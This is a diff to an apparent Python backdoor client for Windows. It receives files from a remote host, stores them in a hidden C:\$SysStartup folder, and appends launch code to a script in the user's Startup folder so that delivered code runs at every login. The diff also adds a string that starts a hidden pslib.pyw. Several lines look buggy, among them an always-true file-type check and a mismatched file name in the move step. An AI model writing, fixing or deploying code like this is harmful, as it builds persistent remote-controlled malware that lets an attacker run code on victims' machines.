@@ -12,7 +12,15 @@ BUFFER = 1024
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
 
-global client
+var = """
+import threading
+from subprocess import call
+
+def a0001(): call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
+a0001 = threading.Thread(target=a0001)
+a0001.start()
+
+"""
 
 
 def connector():
@@ -60,17 +68,20 @@ def process(message):
         msgNoType = message[1:]
         mode = msgNoType[4]
         msg = message[5:]
-        name = f"{randint(100, 900)}.{msgNoType[0:3].replace(' ', '')}"
+        fType = msgNoType[0:3].replace(' ', '')
+        name = f"a{randint(100, 900)}.{fType}"
 
         with open(f"{name}", "w") as fileObj:
             fileObj.write(msg)
 
         if mode == "A":
             if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
-                call(["move", f"{name}", "C:/$SysStartup/temp"], shell=True)
-                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw", "a") as obj:
-                    obj.write(f'{name[0:3]} = lambda:call(["python", f"C:\\$SysStartup\\temp\\{name}"], shell=True)')
-                    obj.write(f'threading.Thread.start()')
+                call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
+                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
+                    if fType == "py" or "pyw":
+                        obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
+                        obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
+                        obj.write(f'b{name[0:4]}.start()')
 
                 sendMsg(name)
             else:
@@ -79,12 +90,10 @@ def process(message):
         else:
             call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
             sendMsg(name)
-    elif ctype == "x":
-        call(["mkdir", "C:\\$SysStartup", "&&", "cd C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
+
     else:
         if message == "!dsc":
             client.close()
-            sleep(30)
             exit()
 
 
